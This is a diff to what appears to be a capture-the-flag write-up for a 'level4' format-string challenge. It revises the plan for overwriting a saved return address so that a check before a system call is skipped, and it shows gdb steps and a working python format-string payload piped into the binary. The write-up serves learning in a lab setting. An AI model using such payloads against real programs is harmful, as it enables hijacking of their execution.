@@ -33,9 +33,8 @@ As usual start with
 	 80484a6:	c3                   	ret
 Like in previous level here is cmp to decide if execute 'system' call, but now the value
 is too huge to overwrite. So use another approach
-See that printf is called from 'p' function.
-Also see that there is 'n' function, which call system.
-Idea is to replace saved eip in 'p' func with addres of 'n' function.
+See that printf is called from separate 'p' function.
+Idea is to replace saved eip in 'p' func so that this cmp will be skipped.
 >>gdb level4
 (gdb) break *0x8048450
 (gdb) run
@@ -47,7 +46,8 @@ Stack level 0, frame at 0xbffff4e0:
  Locals at 0xbffff4d8, Previous frame's sp is 0xbffff4e0
  Saved registers:
   ebp at 0xbffff4d8, eip at 0xbffff4dc
-We noticed that saved eip and address of function we want to run differ only in the last byte.
+We noticed that saved eip and address of 'movl' instruction before 'call' we want
+to run differ only in the last byte.
 Just like in previous level find out offsets and value to be placed in.
 Result is command:
 >>python -c "print '\xdc\xf4\xff\xbf' + '%079x' + ('%x ' * 10) + '%hhn'" | ./level4
